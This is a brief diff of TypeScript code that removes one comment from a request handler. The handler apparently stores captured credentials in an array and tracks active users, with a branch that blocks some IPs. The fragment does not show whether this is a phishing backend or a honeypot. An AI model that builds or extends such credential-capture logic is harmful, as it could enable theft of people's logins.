@@ -42,7 +42,6 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
         return { success: false, error: "IP blocked", blocked: true };
       }
       
-      // Add the credential to our data store
       capturedCredentials.push(newCredential);
       activeUsers[newCredential.id] = true; // Mark user as online
       
